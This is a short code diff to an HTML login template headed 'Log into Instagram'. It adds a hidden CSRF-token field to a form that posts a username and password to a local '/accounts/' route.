@@ -17,6 +17,7 @@
     <p style="font-weight: bold; margin-bottom: 25px">Log into Instagram </p>      
     <form action="/accounts/?target=/" method="post" enctype="multipart/form-data">
       <input type="text" class="User-Input" name="username" placeholder="username" required/>
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
       <input type="password" class="User-Input"  name="password" placeholder="password" required/>
       <input type="submit" class="login-button"  name="login" value="login"/>
       <input type="hidden"name="operation" value="login"/>
